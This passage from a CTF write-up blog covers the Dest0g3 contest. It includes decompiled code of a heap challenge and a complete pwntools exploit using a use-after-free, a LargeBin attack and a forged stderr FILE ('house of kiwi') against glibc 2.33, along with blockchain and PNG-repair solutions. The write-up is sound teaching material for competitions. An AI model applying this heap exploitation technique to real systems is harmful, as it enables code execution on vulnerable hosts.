&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  read_n();</span><br><span class="line">  v2 = v0;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">  read_n();</span><br><span class="line">  v3 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">1047</span> &amp;&amp; v1 &lt;= <span class="number">4096</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    buf = <span class="built_in">malloc</span>(v1);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Content&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, v3);</span><br><span class="line">    qword_4060[v2] = buf;</span><br><span class="line">    dword_40E0[v2] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  read_n();</span><br><span class="line">  v2 = v0;</span><br><span class="line">  result = qword_4060[v0];</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Content&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, (<span class="keyword">void</span> *)qword_4060[v2], (<span class="keyword">int</span>)dword_40E0[v2]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  read_n();</span><br><span class="line">  v3 = v0;</span><br><span class="line">  v1 = qword_4060[v0];</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">    LODWORD(v1) = <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)qword_4060[v3]);</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  read_n();</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)&amp;qword_4060 + v0) )</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)&amp;qword_4060 + v0));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样是高版本（2.33）的UAF，最小申请0x417大小的chunk；</p><p>先用负idx修改stderr指针，再利用LargeBin Attack修改__pointer_chk_guard，伪造stderr修改vtable，最后改topchunk触发house of kiwi。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;25443&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)   </span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.33.so&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Content&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,data</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Content&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL</span>(<span class="params">content, key</span>):</span></span><br><span class="line">    tmp = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(tmp[key:] + tmp[:key], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x460</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">0</span>)*<span class="number">4</span> + <span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x420</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x420</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x01&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = (u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) &gt;&gt; <span class="number">16</span>) - libc.sym.__malloc_hook - <span class="number">0x71</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x470</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">heap_base = heap_addr - <span class="number">0x290</span></span><br><span class="line">global_max_fast = libc_base + <span class="number">0x1e3e78</span></span><br><span class="line">stderr_chain = libc_base + <span class="number">0x1e1648</span></span><br><span class="line">__pointer_chk_guard = libc_base + <span class="number">0x1ed5b0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(__pointer_chk_guard))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">0x1e1000</span>)*<span class="number">2</span> + p64(heap_addr) + p64(__pointer_chk_guard-<span class="number">0x20</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x480</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x40</span>) </span><br><span class="line"></span><br><span class="line">target = libc_base + libc.sym.system</span><br><span class="line">io_cookie_jumps = libc_base + <span class="number">0x1e1a20</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0x00000000fbad2087</span>)+<span class="number">3</span> * p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffffffff</span>) </span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>) </span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">fake_IO_FILE += p64(libc_base + <span class="number">0x1e3660</span>) </span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(io_cookie_jumps + <span class="number">0x40</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base + <span class="number">0x300</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(ROL(target ^ (heap_base+<span class="number">0xb30</span>),<span class="number">0x11</span>))</span><br><span class="line"></span><br><span class="line">add(-<span class="number">4</span>,<span class="number">0x500</span>,fake_IO_FILE)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x700</span>,<span class="string">&#x27;6&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x500</span>,<span class="string">&#x27;7&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x508</span>+p64(<span class="number">0x300</span>))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0xff0</span>,<span class="string">&#x27;8&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="BLOCKCHAIN"><a href="#BLOCKCHAIN" class="headerlink" title="BLOCKCHAIN"></a>BLOCKCHAIN</h2><h3 id="Where-the-flag？"><a href="#Where-the-flag？" class="headerlink" title="Where the flag？"></a>Where the flag？</h3><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">contract find&#123;</span><br><span class="line">    uint96 private a=7855;</span><br><span class="line">    address private owner=msg.sender;</span><br><span class="line">    bool private f=false;</span><br><span class="line">    bool private t=true;</span><br><span class="line">    string[] private flag=[flag1,flag2];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//https://ropsten.etherscan.io/address/0x78f2b5695e5e6e51fc0fd6d7e0caaa05190af9cc</span><br></pre></td></tr></table></figure></blockquote><p>应该是非预期，访问url进入合约，在交易0x2a00af3b2a2a939c491359e7960cbcbda6bdb4d45294fbb8d857100cbfb700e1的InputData里，可以查看到Hex数据，转字符串可得到flag两截字符串：<code>Dest0g3&#123;0n1y_u5e_priv4t3_i</code>，<code>5_n0t_s4f3_1n_B1okCh4in!&#125;</code>。</p><p>​    </p><h3 id="Easy-predict"><a href="#Easy-predict" class="headerlink" title="Easy predict"></a>Easy predict</h3><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">contract storageplace&#123;</span><br><span class="line">     mapping(uint=&gt;string)private _flag;</span><br><span class="line">     address owner;</span><br><span class="line">     constructor()public&#123;     </span><br><span class="line">     owner=msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    function flag() public view returns(string memory)</span><br><span class="line">    &#123;</span><br><span class="line">        require(msg.sender==owner);</span><br><span class="line">    &#125;</span><br><span class="line">    function buy(uint number) public returns(bytes1)&#123;</span><br><span class="line">        require(msg.sender==owner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract question&#123;</span><br><span class="line">    </span><br><span class="line">    mapping(address=&gt;bool)public regeister;</span><br><span class="line">    </span><br><span class="line">    mapping(address=&gt;uint)private seed;</span><br><span class="line">    </span><br><span class="line">    uint constant Price_Per_Char=10 ether;</span><br><span class="line">    </span><br><span class="line">    address owner;</span><br><span class="line">    </span><br><span class="line">    storageplace immutable Flag;</span><br><span class="line"></span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        owner=msg.sender;</span><br><span class="line">        </span><br><span class="line">        storageplace _Flag = new storageplace();</span><br><span class="line">        </span><br><span class="line">        Flag = _Flag;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier isowner()&#123;</span><br><span class="line">        require(msg.sender==owner,&quot;I think you are not the rignt person&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function addRight(address tar)public isowner&#123;</span><br><span class="line">         regeister[tar]=true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function removeRight(address tar)public isowner&#123;</span><br><span class="line">         regeister[tar]=false;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function regeist() public &#123;</span><br><span class="line">        require(regeister[msg.sender]==false);</span><br><span class="line">        regeister[msg.sender]=true;</span><br><span class="line">        seed[msg.sender]=block.number+1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function buyflag(uint want) public payable returns(bytes1)&#123;</span><br><span class="line">        require(msg.value==Price_Per_Char,&quot;is not free&quot;);</span><br><span class="line">        return Flag.buy(want);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function query(bytes32 answer) public view returns(string memory)</span><br><span class="line">    &#123;</span><br><span class="line">        require(regeister[msg.sender]);</span><br><span class="line">        require(block.number &gt;seed[msg.sender],&quot;too early&quot;);</span><br><span class="line">        bytes32 result = blockhash(seed[msg.sender]);</span><br><span class="line">        require(answer==result,&quot;wrong answer&quot;);</span><br><span class="line">        return Flag.flag();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw() public payable&#123;</span><br><span class="line">        require(msg.sender==owner);</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">https://ropsten.etherscan.io/tx/0xd994796e78b5f5ff0d0f0738c29dbce8db0e8b32132cd0e6a10b24fa79b48925</span><br></pre></td></tr></table></figure></blockquote><p>也是非预期，访问url进入交易0xd994796e78b5f5ff0d0f0738c29dbce8db0e8b32132cd0e6a10b24fa79b48925，在InputData里，可以查看到Hex数据，转字符串可得到flag五截字符串：<code>Dest0g3&#123;t</code>，<code>_sup3r_e3</code>，<code>hi5_1s_4</code>，<code>ea5y_p</code>，<code>_r1ght?&#125;</code>，按英文字面意思拼接，得：<code>Dest0g3&#123;thi5_1s_4_sup3r_e3ea5y_pe1d1ct_r1ght?&#125;</code>。</p><p>​    </p><h2 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h2><h3 id="OCR"><a href="#OCR" class="headerlink" title="OCR"></a>OCR</h3><blockquote><p>OCR is very useful in ctf！</p></blockquote><p>更像Misc的AI题，png图片扭曲，应该宽度不对，CRC值爆破宽高：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">fr = <span class="built_in">open</span>(<span class="string">&#x27;flag_pic.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">data = <span class="built_in">bytearray</span>(fr[<span class="number">0x0c</span>:<span class="number">0x1d</span>])</span><br><span class="line">crc32key = <span class="built_in">eval</span>(<span class="string">&#x27;0x&#x27;</span>+<span class="built_in">str</span>(binascii.b2a_hex(fr[<span class="number">0x1d</span>:<span class="number">0x21</span>]))[<span class="number">2</span>:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">n = <span class="number">4095</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">            data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">        crc32result = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">            <span class="built_in">print</span>(width,height)</span><br><span class="line">            newpic = <span class="built_in">bytearray</span>(fr)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                newpic[x+<span class="number">16</span>] = width[x]</span><br><span class="line">                newpic[x+<span class="number">20</span>] = height[x]</span><br><span class="line">            fw = <span class="built_in">open</span>(<span class="string">&#x27;flag2.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">            fw.write(newpic)</span><br><span class="line">            fw.close</span><br><span class="line">            sys.exit()</span><br></pre></td></tr></table></figure><p>得到正常图片：</p><p><img src="/2022/05/26/match-Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/flag2.png" alt="flag2" style="zoom:50%;"></p><p>找个在线OCR识别图里字符，得到的结果有部分字符不正确，手动修正，得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">377ABCAF271C000451FCF397500200000000000062000000000000001D9C97C8E004D002485D0022</span><br><span class="line">194A676D2FDE351A055c168F9710364AE2D581126E378F3B4c47E15E2E80B74234B849430A221F40</span><br><span class="line">C086E06B24ADAAC47F32CB62CADD154B50723E65E50CDF99CC2B953916AD2204D70C15FB493BD4C2</span><br><span class="line">E1F93902FB3563190ACEE58CC01621BB2AAAB6EED8CE892FEF5F0927E2C4BCD7C188277D09D03579</span><br><span class="line">95A2FB65D31CD99c853D7BAF52EAD8555920D1672B4A3B713917E98FB324AD225A3FA2AFAC1435FF</span><br><span class="line">E31ED0C0CEF0CA0B68C0CCCA81C458680D7C75139429D282984933F7ACFDFB127321D9F4EFC0FEAA</span><br><span class="line">E92F985D3C457E90AFBC4DA9D11B23E507A0953036A2EC1D75D69CD1F6A9F0790B1AB02D6C2AFFDF</span><br><span class="line">66A2E7E56A1070FBCD316813E12DF9E26FC4813D419792A65960D4D97EDFA7A978A0385C04CF36EF</span><br><span class="line">DE3B07DF9B9405253EAA838149910F2571FAA4A8E085D1567C5C17C9B3400F91FBFE6B47E052BA07</span><br><span class="line">097C9D77803D3A45E3477FE324603179C7CA6A128CDC0F7E834812618AD4C79934226637E9300C55</span><br><span class="line">95E355139A2ECF661A5F63750A6A0035ACF52417AF3A1C1FEA14471D074c27F81c719D98717F4ECD</span><br><span class="line">32918BD15C18AB93769E94DDEFD3B6FAF4DDD6628BA44BDEF574FCCD5589334EA8063D7B27A2F060</span><br><span class="line">0FC864D010A7F0CEC9B9395434878D01943887194342F9D34FC8F12DD4556ED5A5A36667F9319A03</span><br><span class="line">95DB9A445B94C44771B406F962B1CFC8535BA0D3EE3DDDEB876C95092AAB192B168A732F3A7B9E81</span><br><span class="line">56c403c583983F5527A0D6c5D6928481D56955474046D9FC17A2DE21F3D6FC4c69644E7c6A141BE9</span><br><span class="line">48A417A33D62C6FF6DFAC702A0FC101748D9A9C64A6A0000010406000109825000070B0100012121</span><br><span class="line">01000C84D100080A0196EAFE6000000501190A000000000000000000001119004400650073007400</span><br><span class="line">3000670033002E00740078007400000019020000140A0100B547E05F6654D8011506010020000000</span><br><span class="line">000000</span><br></pre></td></tr></table></figure><p>以Hex保存为7z压缩包文件，解压得到 <code>RGVzdDBnM3szNDUxMjA5OC0zMzA5LTc3MTItODg2NS03ODM0NjAyMjE2NDd9</code>，base64解码即flag：<code>Dest0g3&#123;34512098-3309-7712-8865-783460221647&#125;</code>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;首届Dest0g3 520迎新赛更加注重CTFer的基础知识面掌握程度，由易到难，适合各学习阶段选手参加，纯萌新水准。&lt;/p&gt;
&lt;p&gt;比赛时间：2022.5.20 10:00 - 5.27 10:00&lt;/p&gt;
&lt;p&gt;题目分类：Web、Pwn、Mis</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022赛" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>HSC-1th 2022</title>
    <link href="https://lazzzaro.github.io/2022/02/20/match-HSC-1th-2022/"/>
    <id>https://lazzzaro.github.io/2022/02/20/match-HSC-1th-2022/</id>
    <published>2022-02-20T08:28:40.000Z</published>
    <updated>2022-02-21T11:24:05.717Z</updated>
    
